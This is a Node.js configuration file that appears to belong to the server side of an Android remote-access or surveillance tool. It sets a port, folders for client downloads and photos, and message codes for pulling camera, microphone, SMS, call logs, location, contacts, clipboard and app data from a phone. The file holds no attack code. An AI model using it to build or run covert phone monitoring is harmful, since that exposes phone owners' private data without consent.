const path = require('path');

module.exports = {
    port: 10000,
    debug: false,
    
    // Paths
    dbPath: path.join(__dirname, '../database'),
    downloadsPath: path.join(__dirname, '../database/client_downloads'),
    photosPath: path.join(__dirname, '../database/client_photos'),
    
    // Message keys (matching Android app)
    msg: {
        camera: '0xCA',
        files: '0xFI',
        calls: '0xCL',
        sms: '0xSM',
        mic: '0xMI',
        location: '0xLO',
        contacts: '0xCO',
        wifi: '0xWI',
        notification: '0xNO',
        clipboard: '0xCB',
        apps: '0xIN',
        permissions: '0xPM',
        checkPerm: '0xGP'
    }
};
